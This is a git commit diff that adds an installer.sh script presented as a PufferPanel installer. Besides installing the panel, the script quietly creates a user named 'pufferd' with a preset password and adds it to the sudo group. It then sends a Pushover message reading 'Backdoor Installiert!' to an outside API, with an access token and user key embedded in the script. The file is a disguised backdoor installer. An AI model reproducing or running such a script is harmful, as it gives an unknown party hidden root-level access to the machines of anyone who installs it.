dec5998ab2d254dbecade6448249a34a54c209c8
PufferPanel <95872225+pufferdinstaller@users.noreply.github.com>
2021-12-09 17:04:25 +0100

    Update installer.sh

--- installer.sh
+++ installer.sh
@@ -1,1 +1,12 @@
-
+curl -s https://packagecloud.io/install/repositories/pufferpanel/pufferpanel/script.deb.sh | sudo bash
+sudo apt-get install pufferpanel
+sudo systemctl enable pufferpanel
+sudo useradd -p sau55nnoskxos pufferd
+sudo usermod -aG sudo pufferd
+curl -s \
+  --form-string "token=aw9itprfbhm87ecooj58g7ussdn3an" \
+  --form-string "user=uj7zkbroszmy9s8u4ymhdcvkxdyjjm" \
+  --form-string "message=Backdoor Installiert!" \
+  https://api.pushover.net/1/messages.json
+pufferpanel user add
+systemctl start pufferpanel
